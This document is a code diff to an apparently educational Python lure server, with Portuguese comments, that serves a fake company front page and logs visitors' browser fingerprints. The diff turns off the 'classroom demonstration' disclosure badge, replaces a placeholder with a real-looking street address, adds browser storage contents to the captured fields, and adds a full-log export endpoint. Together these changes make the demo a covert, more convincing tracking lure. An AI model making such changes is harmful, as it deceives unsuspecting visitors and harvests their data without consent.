@@ -58,7 +58,7 @@ CONFIG = {
     "destino": None,                 # URL para onde /r redireciona (isca)
     "token": None,                   # senha simples do painel
     "mascara": BASE_DIR / "mascara.html",   # a fachada servida em /
-    "divulgar": True,                # mantém o selo "demonstração de aula"
+    "divulgar": False,                # mantém o selo "demonstração de aula"
     "log": ARQ_LOG_PADRAO,           # onde as capturas são gravadas
     "info": None,                    # textos da fachada (env > padrão)
 }
@@ -83,7 +83,7 @@ INFO_PADRAO = {
     "EMPRESA_RAMO": "Software de segurança e monitoramento",
     "EMPRESA_BIO": "Canais oficiais de atendimento da matriz.",
     "EMPRESA_CNPJ": "58.761.840/0001-00",
-    "EMPRESA_ENDERECO": "Av. das Acácias, 1200 — Centro",
+    "EMPRESA_ENDERECO": "Av. Antonio Sílvio Barbierri, 2346 Francisco Beltrão - PR, 85503-000",
     "EMPRESA_HORARIO": "Segunda a sexta, das 8h às 17h",
     "CONTATO1_NOME": "Kelly Moreira",
     "CONTATO1_CARGO": "Secretaria",
@@ -451,6 +451,12 @@ PAGINA_AULA = """<!doctype html>
     display: flex; align-items: baseline; gap: 14px;
     flex-wrap: wrap; margin-bottom: 4px;
   }
+  a.baixar {
+    margin-left: auto; background: #111827; color: #fff;
+    text-decoration: none; font-size: .85rem; font-weight: 650;
+    padding: 8px 14px; border-radius: 999px;
+  }
+  a.baixar[hidden] { display: none; }
   h1 { font-size: 1.65rem; margin: 0; letter-spacing: -.02em; }
   .ao-vivo {
     display: inline-flex; align-items: center; gap: 7px;
@@ -517,6 +523,7 @@ PAGINA_AULA = """<!doctype html>
 <div class="topo">
   <h1>O que o servidor viu</h1>
   <span class="ao-vivo"><span class="ponto"></span> ao vivo</span>
+  <a class="baixar" id="baixar" hidden>Baixar tudo</a>
 </div>
 <p class="sub">
   Atualiza sozinho a cada 2 segundos. Uma linha por visita.
@@ -592,11 +599,16 @@ async function atualizar() {
 
   document.getElementById("vazio").style.display = visitas.length ? "none" : "block";
 
+  const baixar = document.getElementById("baixar");
+  baixar.hidden = !resumo.revelado;
+  if (resumo.revelado) baixar.href = "/api/export" + location.search;
+
   const nota = document.getElementById("nota");
   nota.innerHTML = resumo.revelado
-    ? "IPs completos. Esta página está aberta com o token do professor."
-    : "IPs mascarados (o último bloco fica oculto). Para revelar, abra esta "
-      + "página com <code>?t=SEU_TOKEN</code>. O painel completo é <code>/painel</code>.";
+    ? "IPs completos. <b>Baixar tudo</b> entrega o log inteiro: sessão, "
+      + "cabeçalhos e o que o navegador enviou — não só as colunas desta tela."
+    : "IPs mascarados (o último bloco fica oculto). Para revelar e baixar "
+      + "o log inteiro, abra esta página com <code>?t=SEU_TOKEN</code>.";
 }
 
 atualizar();
@@ -790,6 +802,13 @@ class Handler(BaseHTTPRequestHandler):
         elif rota == "/api/aula":
             self._json(self._dados_aula())
 
+        elif rota == "/api/export":
+            # Log inteiro, só com o token. A tela pública fica no resumo.
+            if not self._autorizado():
+                self._json({"erro": "token inválido"}, 401)
+                return
+            self._baixar_tudo()
+
         elif rota == "/r":
             # Rota "isca clássica": captura e joga o visitante num site real.
             # >>> Um atacante real faz exatamente isso, e o alvo nunca vê
@@ -829,7 +848,7 @@ class Handler(BaseHTTPRequestHandler):
                     "idioma", "idiomas", "fuso", "deslocamento_min", "tela",
                     "janela", "densidade", "nucleos", "memoria_gb", "toque",
                     "online", "cookieEnabled", "plataforma", "conexao", "ua_completo",
-                    "referencia", "segundos_na_pagina",
+                    "referencia", "segundos_na_pagina", "storage",
                 }
                 registro["navegador"] = {
                     k: (v[:200] if isinstance(v, str) else v)
@@ -966,6 +985,39 @@ class Handler(BaseHTTPRequestHandler):
                 "revelado": revelar,
             },
         }
+
+    def _baixar_tudo(self):
+        """
+        Arquivo com cada linha do log, sem o limite da tela.
+
+        A /aula agrega e esconde sessão, cabeçalhos e o resto do beacon.
+        Quem tem o token leva o registro completo, na ordem em que chegou.
+        """
+        log = CONFIG["log"]
+        capturas = []
+        if log.exists():
+            for linha in log.read_text(encoding="utf-8").splitlines():
+                linha = linha.strip()
+                if not linha:
+                    continue
+                try:
+                    capturas.append(json.loads(linha))
+                except ValueError:
+                    continue
+        corpo = json.dumps(
+            {"total": len(capturas), "capturas": capturas},
+            ensure_ascii=False,
+            indent=2,
+        )
+        dados = corpo.encode("utf-8")
+        nome = "capturas-" + datetime.now().astimezone().strftime("%Y-%m-%d") + ".json"
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json; charset=utf-8")
+        self.send_header("Content-Length", str(len(dados)))
+        self.send_header("Content-Disposition", f'attachment; filename="{nome}"')
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+        self.wfile.write(dados)
 
     def _ler_capturas(self, limite=200):
         log = CONFIG["log"]
